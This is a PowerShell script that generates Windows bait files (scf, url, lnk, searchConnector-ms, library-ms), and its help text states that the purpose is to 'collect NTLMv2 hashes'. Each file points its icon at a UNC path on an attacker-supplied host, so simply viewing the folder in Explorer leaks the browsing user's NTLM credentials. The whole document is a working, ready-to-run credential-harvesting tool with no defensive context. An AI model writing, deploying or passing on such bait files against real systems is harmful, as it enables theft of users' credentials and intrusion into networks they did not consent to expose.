function New-Seed {
<#
.SYNOPSIS
File generator for hunting for NTLM hashes.
.DESCRIPTION
Small script that generates a file that when is showed on windows explorer will try to retrieve an icon from a remote conection, its purpose is to collect NTLMv2 hashes.
Supported types scf, url, lnk, searchConnector-ms and library-ms.
.PARAMETER RemoteLocation
IP where the icon will try to load from.
.PARAMETER SeedType
Type of generated file, the ones available are scf, url, lnk, searchConnector-ms and library-ms.
.EXAMPLE
New-Seed -RemoteLocation 192.168.1.250 -SeedType url
#>
    param(
        [Parameter (Mandatory = $True)]
        [string]
        $RemoteLocation,
        [Parameter (Mandatory = $True)]
        [string]
        $SeedType
    )
    switch ($SeedType) {

        scf {
            $content = @"
[Shell]
Command=2
IconFile=\\$RemoteLocation\share\seed.ico
[Taskbar]
Command=ToggleDesktop
"@
            $content | Out-File -NoNewline seed.scf
        }
        url {
            $content = @"
[InternetShortcut]
URL=dispenser
WorkingDirectory=dispenser
IconFile=\\$RemoteLocation\\%USERNAME%.icon
IconIndex=1
"@
            $content | Out-File -NoNewline seed.url
        }
        searchConnector-ms {
            $content = @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>imageres.dll,-1002</iconReference>
  <description>Microsoft Outlook</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <iconReference>\\$RemoteLocation\seed</iconReference>
  <templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo>
  <simpleLocation>
    <url>\\$RemoteLocation\seed.ico</url>
  </simpleLocation>
</searchConnectorDescription>
"@
            $content | Out-File -NoNewline seed.searchConnector-ms
        }
        library-ms {
            $content = @"
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
      <url>\\$RemoteLocation\seed</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"@
            $content | Out-File -NoNewline seed.library-ms
        }
        lnk {
            $comobject = New-Object -ComObject WScript.Shell.1
            $shortcut = $comobject.CreateShortcut("$Pwd\Seed.lnk")
            $shortcut.TargetPath = "cmd"
            $shortcut.IconLocation = "\\$RemoteLocation\see.png"
            $shortcut.save()
        }
}
}

#New-Seed ($RemoteLocation, $SeedType)